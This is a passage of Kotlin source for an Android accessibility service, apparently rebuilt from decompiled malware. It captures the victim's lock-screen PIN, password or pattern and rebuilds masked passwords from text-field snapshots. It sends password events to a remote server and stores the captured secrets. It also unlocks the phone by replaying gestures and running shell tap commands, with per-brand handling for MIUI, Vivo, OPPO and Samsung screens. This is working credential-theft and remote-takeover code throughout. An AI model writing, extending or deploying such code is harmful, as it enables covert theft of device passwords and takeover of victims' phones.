            try { source.recycle() } catch (_: Exception) {}
        } catch (e: Exception) {
            Log.d(TAG, "handleHoverEvent error: ${e.message}")
        }
    }

    /**
     * 更新 overlay watcher 心跳。
     * vendor: e6
     */
    fun updateOverlayWatcher() {
        lastCheckTime = System.currentTimeMillis()
    }

    /**
     * 发送密码事件（通过 coroutine）。
     * vendor: d9 — sendPasswordEvent
     */
    fun sendPasswordEvent(type: String) {
        if (type.isEmpty()) return
        // vendor: d9 — 通过 coroutine 发送 intentCode + lockBatchId 到 WS
        try {
            val batchId = lockBatchId
            val json = JSONObject()
            json.put("intentCode", type)
            if (batchId > 0) {
                json.put("lockBatchId", batchId.toString())
            }
            val svc = com.storm.safe.rock.service.MyAccessibilityService.getInstance()
            val networkManager = svc?.getNetworkManager()
            if (networkManager != null) {
                networkManager.sendEvent("lock_password_event", json)
            }
            Log.d(TAG, "📡 密码事件已发送: intentCode=$type, lockBatchId=$batchId")
        } catch (e: Exception) {
            Log.w(TAG, "发送密码事件失败: ${e.message}")
        }
    }

    // ==================== 新增方法 — JADX 完整实现 ====================

    /** 从 viewId 提取按键字符。vendor: d6 click handler */
    fun extractKeyDigit(viewId: String): String? {
        if (viewId.isEmpty()) return null
        if (viewId.contains(":id/key") && !viewId.contains("VivoPinkey")) {
            val suffix = viewId.substringAfter("key")
            if (suffix.length == 1 && (suffix[0].isDigit() || suffix[0].isLetter())) return suffix
            if (suffix.length == 2 && suffix[0] == '_' && suffix[1].isLetter()) return suffix[1].toString()
        }
        if (viewId.contains(":id/VivoPinkey")) {
            val suffix = viewId.substringAfter("VivoPinkey")
            if (suffix.length == 1 && suffix[0].isDigit()) return suffix
        }
        if (viewId.contains(":id/num")) {
            val suffix = viewId.substringAfter("num")
            if (suffix.length == 1 && suffix[0].isDigit()) return suffix
        }
        if (viewId.contains(":id/char_")) {
            val suffix = viewId.substringAfter("char_")
            if (suffix.length == 1) return suffix
        }
        return null
    }

    /** 判断 viewId/desc 是否为删除键。vendor: d6 */
    fun isDeleteKey(viewId: String, desc: String): Boolean {
        if (viewId.contains("delete", ignoreCase = true) || viewId.contains("backspace", ignoreCase = true) || viewId.contains("del", ignoreCase = true)) return true
        if (desc.isNotEmpty()) return DELETE_LABELS.any { desc.equals(it, ignoreCase = true) }
        return false
    }

    /** 判断 viewId 是否为确认键。vendor: d6 */
    fun isConfirmKey(viewId: String, eventText: String): Boolean {
        val confirmIds = listOf("enter", "confirm", "iv_complete", "vivo_pin_confirm", "btn_letter_ok", "mix_confirm", "mix_normal_confirm")
        if (viewId.isNotEmpty() && confirmIds.any { viewId.contains(it, ignoreCase = false) }) return true
        if (eventText.isNotEmpty()) return CONFIRM_LABELS.any { eventText.contains(it, ignoreCase = true) }
        return false
    }

    /** 从多个快照中重建密码。vendor: d6 TEXT_CHANGED — plug.c.i() */
    fun reconstructPasswordFromSnapshots(snapshots: ArrayList<String>): String? {
        if (snapshots.isEmpty()) return null
        var maxLen = 0
        for (s in snapshots) { if (s.length > maxLen) maxLen = s.length }
        if (maxLen == 0) return null
        val result = Array(maxLen) { "*" }
        for (snapshot in snapshots) {
            for (i in snapshot.indices) {
                val ch = snapshot[i].toString()
                if (ch != "*") result[i] = ch
            }
        }
        val reconstructed = result.joinToString("")
        if (reconstructed.contains("*")) {
            if (snapshots.size > 50) Log.w(TAG, "⚠️ 快照超过50个仍未完整: $reconstructed")
            return null
        }
        Log.d(TAG, "🔑 plug.c.i() 已破解文本密码: 长度=${reconstructed.length}")
        return reconstructed
    }

    /** 完整 clickConfirmButton — MIUI/Vivo/Samsung/通用。vendor: a2 (65 行) */
    fun clickConfirmButtonFull() {
        try {
            val root = service.rootInActiveWindow ?: return
            val pkg = root.packageName?.toString() ?: "com.android.settings"
            val basePkg = if (pkg == "com.android.systemui") "com.android.systemui" else "com.android.settings"
            val isMiui = Build.BRAND.lowercase(Locale.ROOT).let { it == "xiaomi" || it == "redmi" || it == "poco" }
            if (isMiui) {
                var btn = findNodeByViewIdAndClass(root, "$basePkg$MIUI_CONFIRM_KEY", "android.widget.TextView")
                if (btn == null) btn = findNodeByViewIdAndClass(root, "com.android.systemui$MIUI_CONFIRM_KEY", "android.widget.TextView")
                if (btn != null && btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)) { Log.d(TAG, "点击MIUI确认键"); return }
            }
            val isVivo = Build.BRAND.lowercase(Locale.ROOT).let { it == "vivo" || it == "iqoo" }
            if (isVivo) {
                for ((id, cls) in listOf(Pair("$basePkg:id/mix_confirm", "android.view.View"), Pair("$basePkg:id/iv_complete", "android.widget.TextView"), Pair("$basePkg:id/vivo_pin_confirm", "android.widget.Button"), Pair("$basePkg:id/mix_normal_confirm", "android.widget.TextView"))) {
                    var node = findNodeByViewIdAndClass(root, id, cls) ?: findNodeByViewId(root, id)
                    if (node != null && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) { Log.d(TAG, "点击Vivo确认键: $id"); return }
                    if (basePkg != "com.android.settings") { val altId = id.replace(basePkg, "com.android.settings"); node = findNodeByViewIdAndClass(root, altId, cls) ?: findNodeByViewId(root, altId); if (node != null && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) { Log.d(TAG, "点击Vivo确认键(fallback): $altId"); return } }
                }
            }
            for (id in listOf("$basePkg:id/key_enter", "com.android.systemui:id/key_enter", "com.android.settings:id/key_enter")) {
                val nodes = root.findAccessibilityNodeInfosByViewId(id)
                if (nodes != null) for (node in nodes) if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) { Log.d(TAG, "点击通用Enter键: $id"); return }
            }
            clickConfirmButton()
        } catch (e: Exception) { Log.w(TAG, "clickConfirmButtonFull error: ${e.message}") }
    }

    /** 完整 sendEnterKeypress — ADB keyevent 66 + IME_ENTER fallback。vendor: a4 */
    fun sendEnterKeypressFull(node: AccessibilityNodeInfo) {
        try {
            val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", "input keyevent 66"))
            if (!p.waitFor(10L, TimeUnit.SECONDS)) p.destroy()
            if (p.exitValue() == 0) return
        } catch (e: Exception) { Log.w(TAG, "input keyevent 66 失败: ${e.message}") }
        try { if (Build.VERSION.SDK_INT >= 30) node.performAction(AccessibilityNodeInfo.AccessibilityAction.ACTION_IME_ENTER.id) } catch (e: Exception) { Log.w(TAG, "IME_ENTER 失败: ${e.message}") }
    }

    /** 完整图案重放 — 4次尝试递增时间。vendor: a5 (40 行) */
    fun playPatternGestureFull(points: ArrayList<android.graphics.PointF>): Boolean {
        if (points.size < 2) return verifySuccess()
        for (attempt in 1 until 5) {
            val duration = (attempt * 1000).toLong()
            try {
                Log.d(TAG, "图案重放第 $attempt 次, 持续时间=${duration}ms, 点数=${points.size}")
                val path = android.graphics.Path()
                path.moveTo(points[0].x, points[0].y)
                for (i in 1 until points.size) path.lineTo(points[i].x, points[i].y)
                val gesture = android.accessibilityservice.GestureDescription.Builder().addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 10L, duration)).build()
                if (service.dispatchGesture(gesture, null, null)) {
                    Thread.sleep(duration + 1000)
                    if (verifySuccess()) { Log.d(TAG, "图案验证成功 (第 $attempt 次)"); return true }
                } else Log.d(TAG, "图案重放第 $attempt 次: dispatchGesture 返回 false")
            } catch (e: Exception) { Log.d(TAG, "图案重放第 $attempt 次异常: ${e.message}") }
        }
        return verifySuccess()
    }

    /** 图案网格索引回退。vendor: e5 (42 行) */
    fun tryPatternGridFallback(patternIndices: List<Int>): Boolean {
        if (patternIndices.size < 4) return false
        val root = service.rootInActiveWindow ?: return false
        val pkg = root.packageName?.toString() ?: "com.android.settings"
        val ids = listOf("$pkg:id/lockPattern", "com.android.settings:id/lockPattern", "com.android.systemui:id/lockPattern", "com.coloros.settings:id/lockPattern", "com.oplus.settings:id/lockPattern")
        var patternNode: AccessibilityNodeInfo? = null
        for (id in ids) { val n = root.findAccessibilityNodeInfosByViewId(id); if (n != null && n.isNotEmpty()) { patternNode = n[0]; break } }
        if (patternNode == null) patternNode = findPatternNodeByClass(root)
        if (patternNode == null) return false
        val bounds = android.graphics.Rect(); patternNode.getBoundsInScreen(bounds)
        val cellW = bounds.width() / 3.0f; val cellH = bounds.height() / 3.0f
        val points = ArrayList<android.graphics.PointF>()
        for (idx in patternIndices) { val col = idx % 3; val row = idx / 3; points.add(android.graphics.PointF((cellW / 2.0f) + (col * cellW) + bounds.left, (cellH / 2.0f) + (row * cellH) + bounds.top)) }
        return playPatternGestureFull(points)
    }

    /** 完整 tryAdbPinInput。vendor: e2 (58 行) */
    fun tryAdbPinInputFull(pin: String): Boolean {
        try {
            val root = service.rootInActiveWindow ?: return false
            val pkg = root.packageName?.toString() ?: "com.android.settings"
            val basePkg = if (pkg == "com.android.systemui") "com.android.systemui" else "com.android.settings"
            val keyBounds = LinkedHashMap<String, android.graphics.Rect>()
            for (d in 0..9) { val n = root.findAccessibilityNodeInfosByViewId("$basePkg:id/key$d"); if (n != null && n.isNotEmpty()) { val r = android.graphics.Rect(); n[0].getBoundsInScreen(r); keyBounds[d.toString()] = r } }
            if (keyBounds.size < 10) { Log.w(TAG, "ADB PIN: 只找到 ${keyBounds.size} 个按键，放弃"); return false }
            for (ch in pin) { val r = keyBounds[ch.toString()] ?: continue; try { val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", "input tap ${r.centerX()} ${r.centerY()}")); if (!p.waitFor(10L, TimeUnit.SECONDS)) p.destroy() } catch (e: Exception) { Log.w(TAG, "ADB tap 失败: ${e.message}") }; try { Thread.sleep(400L) } catch (_: Exception) {} }
            clickConfirmButtonFull(); return verifySuccess()
        } catch (e: Exception) { Log.w(TAG, "tryAdbPinInput 异常: ${e.message}"); return false }
    }

    /** 完整 tryKeyNodeInput — OPPO/Vivo/通用。vendor: e4 (149 行) */
    fun tryKeyNodeInputFull(pin: String, qualityType: String): Boolean {
        try {
            val root = service.rootInActiveWindow ?: return false
            val pkg = root.packageName?.toString() ?: ""
            val isSystemUi = pkg == "com.android.systemui"
            val basePkg = when { isSystemUi -> "com.android.systemui"; pkg == "com.samsung.android.biometrics.app.setting" -> pkg; else -> "com.android.settings" }
            val brand = Build.BRAND.lowercase(Locale.ROOT)
            if (brand == "oppo" || brand == "realme" || brand == "oneplus") {
                var cr = service.rootInActiveWindow ?: root
                for (ch in pin) { val n = findNodeByContentDesc(cr, ch.toString()); if (n != null && n.performAction(AccessibilityNodeInfo.ACTION_CLICK)) { Log.d(TAG, "Click Pin Node desc: $ch"); if (isSystemUi) sleep200() else sleep500() }; try { cr.refresh() } catch (_: Exception) {} }
                clickConfirmButtonFull()
            }
            if (brand == "vivo" || brand == "iqoo") {
                var cr = service.rootInActiveWindow ?: root; var any = false
                for (ch in pin) { val n = findNodeByViewId(cr, "$basePkg:id/four_to_more_key$ch"); if (n != null && n.performAction(AccessibilityNodeInfo.ACTION_CLICK)) { if (isSystemUi) sleep200() else sleep500(); any = true }; try { cr.refresh() } catch (_: Exception) {} }
                if (any) { clickConfirmButtonFull(); if (verifySuccess()) return true }
            }
            var cr = service.rootInActiveWindow ?: root; var any = false
            for (ch in pin) { val id = "$basePkg:id/key$ch"; val n = findNodeByViewIdAndClass(cr, id, "android.view.ViewGroup") ?: findNodeByViewId(cr, id); if (n != null && n.performAction(AccessibilityNodeInfo.ACTION_CLICK)) { if (isSystemUi) sleep200() else sleep500(); any = true }; try { cr.refresh() } catch (_: Exception) {} }
            if (any) { clickConfirmButtonFull(); return verifySuccess() }
            return false
        } catch (e: Exception) { Log.w(TAG, "tryKeyNodeInput 异常: ${e.message}"); return false }
    }

    /** 完整 notifyPasswordPageDismissed — 时间阈值。vendor: b8 (40 行) */
    fun notifyPasswordPageDismissedFull() {
        if (!isListening) { Log.d(TAG, "🔷 监听模式已关闭，取消重新弹出"); return }
        val saved = loadCipherFromPrefs(true) ?: loadCipherFromPrefs(false)
        if (saved != null) { val elapsed = System.currentTimeMillis() - (saved["timestamp"] as? Long ?: 0L); if (elapsed < 30000) { Log.d(TAG, "🔷 已有密码（${elapsed}ms前），不再弹出"); notifyPasswordCaptureSuccess(); return } }
        Log.d(TAG, "🔷 通知重新弹出密码框")
    }

    /** 完整 stopListening — 清理所有状态。vendor: b5 (30 行) */
    fun stopListeningFull() {
        isListening = false; collectedEvents.clear(); hasAlpha = false; pinDigits.clear(); passwordChars.clear(); passwordSnapshots.clear(); lastEventTime = 0L; overlayPending = false
        overlayRunnable?.let { handler.removeCallbacks(it) }; overlayRunnable = null; resetOverlayWatcher()
        delayedChecks.forEach { handler.removeCallbacks(it) }; delayedChecks.clear()
        patternOverlay?.stopCapture(false); patternOverlay = null
        Log.d(TAG, "❌ 禁用系统密码监听模式")
    }

    /** 完整 syncToAppStatusManager — 类型映射。vendor: e1 (30 行) */
    fun syncToAppStatusManagerFull(cipher: Any?) {
        try {
            val ctx = service.applicationContext ?: return; val map = cipher as? Map<*, *> ?: return
            val isLocked = map["isLocked"] as? Boolean ?: true; if (!isLocked) return
            val quality = map["quality"] as? String ?: ""; val text = map["text"] as? String
            @Suppress("UNCHECKED_CAST") val pattern = map["patternIndices"] as? List<Int>
            val type = when { quality == QUALITY_NUMERIC || quality == "PASSWORD_QUALITY_NUMERIC_COMPLEX" -> if ((text?.length ?: 0) <= 4) "4pin" else "6pin"; quality == QUALITY_ALPHA -> "mixed"; quality == QUALITY_PATTERN -> "pattern"; else -> "unknown" }
            val value = if (quality == QUALITY_PATTERN && pattern != null) pattern.joinToString(",") else text ?: ""
            AppStatusManager.getInstance(ctx).saveLockPassword(type, true, value)
            Log.d(TAG, "✅ 同步到 AppStatusManager: type=$type")
        } catch (e: Exception) { Log.w(TAG, "❌ 同步失败: ${e.message}") }
    }

    /** 完整 tryFindAndClickUseCredential。vendor: e3 (42 行) */
    fun tryFindAndClickUseCredentialFull(): Boolean {
        try {
            val root = service.rootInActiveWindow ?: return false
            for (id in USE_CREDENTIAL_BUTTON_IDS) { val n = findNodeByViewIdAndClass(root, id, "android.widget.TextView") ?: findNodeByViewId(root, id); if (n != null && clickNodeWithFallback(n, id)) return true }
            for (desc in USE_CREDENTIAL_TEXTS) { val n = findNodeByContentDesc(root, desc); if (n != null && clickNodeWithFallback(n, "use_credential: $desc")) return true }
        } catch (e: Exception) { Log.w(TAG, "tryFindAndClickUseCredential 异常: ${e.message}") }
        return false
    }

    /** 完整 handleClickEvent — JADX d6 CLICKED。vendor: d6 eventType==1 */
    fun handleClickEventFull(event: AccessibilityEvent, pkg: String, className: String) {
        try {
            val source = try { event.source } catch (_: Exception) { null }
            val viewId = source?.viewIdResourceName ?: ""; val desc = source?.contentDescription?.toString() ?: event.contentDescription?.toString() ?: ""; val eventText = event.text?.firstOrNull()?.toString() ?: ""
            Log.d(TAG, "🔍 CLICKED: pkg=$pkg, viewId=$viewId, desc=$desc, eventText=$eventText")
            if (isDeleteKey(viewId, desc)) { if (pinDigits.isNotEmpty()) { pinDigits.removeAt(pinDigits.size - 1); Log.d(TAG, "🔙 退格") }; try { source?.recycle() } catch (_: Exception) {}; return }
            var digit = extractKeyDigit(viewId); var isCharKey = false
            if (viewId.contains(":id/char_")) { val s = viewId.substringAfter("char_"); if (s.length == 1) { digit = s; isCharKey = true } }
            if (digit == null) { if (desc.length == 1 && Regex("[0-9a-zA-Z]").matches(desc)) digit = desc else if (eventText.length == 1 && Regex("[0-9a-zA-Z]").matches(eventText)) digit = eventText }
            if (digit != null) { pinDigits.add(digit); if (isCharKey || (digit.length == 1 && digit[0].isLetter())) hasAlpha = true; Log.d(TAG, "🔢 捕获: $digit (序列: ${pinDigits.joinToString("")})") }
            if (isConfirmKey(viewId, eventText)) { val text = pinDigits.joinToString(""); if (text.isNotEmpty()) { bufferCipher(text, if (hasAlpha) "password" else "pin"); pinDigits.clear(); hasAlpha = false } }
            try { source?.recycle() } catch (_: Exception) {}
        } catch (e: Exception) { Log.d(TAG, "handleClickEventFull error: ${e.message}") }
    }

    /** 完整 handleTextChangedEvent — 多快照密码重建。vendor: d6 eventType==16 */
    fun handleTextChangedEventFull(event: AccessibilityEvent, pkg: String, className: String) {
        if (!className.contains("EditText", ignoreCase = true)) return
        try {
            val source = try { event.source } catch (_: Exception) { null }
            if (source != null && !source.isPassword) { val et = event.text?.firstOrNull()?.toString() ?: ""; if (!containsMaskChars(et) && et.isNotEmpty()) { try { source.recycle() } catch (_: Exception) {}; return } }
            try { source?.recycle() } catch (_: Exception) {}
            val maxLen = passwordSnapshots.maxOfOrNull { it.length } ?: 0
            val masked = event.text?.firstOrNull()?.toString()?.let { maskPasswordChars(it) }; val curLen = masked?.length ?: 0
            if (curLen < maxLen && maxLen > 0) { if (curLen == 0) { passwordSnapshots.clear(); pinDigits.clear(); lastEventTime = 0L } else { passwordSnapshots.removeAll { it.length > curLen }; repeat(maxLen - curLen) { if (pinDigits.isNotEmpty()) pinDigits.removeAt(pinDigits.size - 1) } } }
            var hasNew = false
            if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) { event.beforeText?.toString()?.let { maskPasswordChars(it) }?.let { passwordSnapshots.add(it); hasNew = true } }
            masked?.let { passwordSnapshots.add(it); hasNew = true }
            try { event.source?.text?.toString()?.let { maskPasswordChars(it) }?.let { if (it != masked) { passwordSnapshots.add(it); hasNew = true } } } catch (_: Exception) {}
            if (hasNew) { val cracked = reconstructPasswordFromSnapshots(passwordSnapshots); if (cracked != null) bufferCipher(cracked, "password") }
        } catch (e: Exception) { Log.d(TAG, "handleTextChangedEventFull error: ${e.message}") }
    }

    /** 完整 monitorSystemPasswordInput。vendor: d6 (485 行) */
    fun monitorSystemPasswordInputFull(event: AccessibilityEvent) {
        if (!isListening) return
        val pkg = event.packageName?.toString() ?: return
        // ADAPT 2026-04-17: use isPasswordInputPackage to include OPPO/vivo/ColorOS variants
        if (!isPasswordInputPackage(pkg)) return
        val className = event.className?.toString() ?: ""
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_CLICKED -> handleClickEventFull(event, pkg, className)
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChangedEventFull(event, pkg, className)
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_VIEW_FOCUSED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
            AccessibilityEvent.TYPE_WINDOWS_CHANGED -> {
                if (processingFlag.compareAndSet(false, true)) {
                    Thread { checkLockScreenType(); processingFlag.set(false) }.start()
                }
                updateOverlayWatcher()
                if (isListening) {
                    val root = try { service.rootInActiveWindow } catch (_: Exception) { null }
                    val actualPkg = root?.packageName?.toString() ?: pkg
                    try { root?.recycle() } catch (_: Exception) {}
                    // ADAPT 2026-04-17: tighten dismiss detection using vendor m211804a1.
                    // Dismiss only when (a) pkg is NOT a password package AND (b) UI is NOT ConfirmLock.
                    // Using isPasswordInputPackage (Task 3) for OPPO/vivo coverage.
                    //
                    // MIUI 14/15 race: `TYPE_VIEW_FOCUSED` + `TYPE_WINDOW_CONTENT_CHANGED` may fire
                    // while ConfirmLock viewIds are still being rendered. If we ran
                    // `isInConfirmLockScreen()` on those events, it could return false mid-render
                    // and trigger premature dismiss. vendor m211804a1 is only called on genuine
                    // window-state transitions; we match that by scoping the viewId probe to
                    // TYPE_WINDOW_STATE_CHANGED only. For other event types, we fall back to
                    // package-name match alone (matches pre-Task-6 behavior).
                    val pkgStillPasswordLike = isPasswordInputPackage(actualPkg)
                    val stillInConfirmLock = if (pkgStillPasswordLike &&
                            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                        isInConfirmLockScreen()
                    } else {
                        // Non-window-state events: assume still on lock screen if pkg matches.
                        pkgStillPasswordLike
                    }
                    if (!pkgStillPasswordLike || !stillInConfirmLock) {
                        val now = System.currentTimeMillis()
                        if (now - lastCheckTime < checkInterval) return
                        lastCheckTime = now
                        val hasText = pinDigits.isNotEmpty() || passwordChars.isNotEmpty()
                        val hasPending = pendingCipher != null
                        if (!hasText && !hasPending) {
                            handler.post { notifyPasswordPageDismissedFull() }
                        } else {
                            if (pendingCipher == null && pinDigits.isNotEmpty()) {
                                bufferCipher(pinDigits.joinToString(""), if (hasAlpha) "password" else "pin")
                            }
                            confirmAndSaveLastCipher()
                            notifyPasswordCaptureSuccess()
                            stopListeningFull()
                        }
                    }
                }
            }
            AccessibilityEvent.TYPE_VIEW_HOVER_ENTER -> handleHoverEvent(event)
        }
    }

    // =============================================
    // View Cache Rule Management (mapped from C0341a7 methods)
    // JADX: f53385a2 = rules map, f53388a5 = active flag
    // =============================================

    /** View cache rules map. JADX: f53385a2 */
    private val viewCacheRules = mutableMapOf<String, com.storm.safe.rock.service.modules.command.ViewCacheRule>()

    /** View cache active flag. JADX: f53388a5 */
    @Volatile
    private var viewCacheActive: Boolean = false

    /**
     * Set view cache rules (replaces all). JADX: m211869a9(rules).
     */
    fun setViewCacheRules(rules: List<com.storm.safe.rock.service.modules.command.ViewCacheRule>) {
        synchronized(viewCacheRules) {
            viewCacheRules.clear()
            for (rule in rules) {
                viewCacheRules[rule.packageName] = rule
            }
            viewCacheActive = viewCacheRules.isNotEmpty()
        }
        persistViewCacheRules()
    }

    /**
     * Add a single view cache rule. JADX: m211861a0(pkg, classes, appName).
     */
    fun addViewCacheRule(packageName: String, classes: List<String>, appName: String) {
        synchronized(viewCacheRules) {
            viewCacheRules[packageName] = com.storm.safe.rock.service.modules.command.ViewCacheRule(packageName, classes, appName)
            viewCacheActive = true
        }
        persistViewCacheRules()
    }

    /**
     * Remove a view cache rule by package name. JADX: m211866a5(pkg).
     */
    fun removeViewCacheRule(packageName: String) {
        synchronized(viewCacheRules) {
            viewCacheRules.remove(packageName)
            viewCacheActive = viewCacheRules.isNotEmpty()
        }
        persistViewCacheRules()
    }

    /**
     * Clear all view cache rules. JADX: f53385a2.clear() + m211872b2().
     */
    fun clearViewCacheRules() {
        synchronized(viewCacheRules) {
            viewCacheRules.clear()
            viewCacheActive = false
        }
        persistViewCacheRules()
    }

    /**
     * Get package names from current rules. JADX: m211862a1().
     */
    fun getViewCachePackageNames(): List<String> {
        synchronized(viewCacheRules) {
            return viewCacheRules.keys.toList()
        }
    }

    /**
     * Check if view cache is active. JADX: f53388a5.get().
     */
    fun isViewCacheActive(): Boolean = viewCacheActive

    /**
     * Persist view cache rules. JADX: m211872b2().
     */
    private fun persistViewCacheRules() {
        try {
            val prefs = context.getSharedPreferences("view_cache_rules", 0)
            val jsonArray = org.json.JSONArray()
            synchronized(viewCacheRules) {
                for ((_, rule) in viewCacheRules) {
                    jsonArray.put(org.json.JSONObject().apply {
                        put("packageName", rule.packageName)
                        put("appName", rule.appName)
                        put("listenClasses", org.json.JSONArray(rule.listenClasses))
                    })
                }
            }
            prefs.edit().putString("rules", jsonArray.toString()).apply()
        } catch (e: Exception) {
            Log.e(TAG, "persistViewCacheRules failed", e)
        }
    }
}

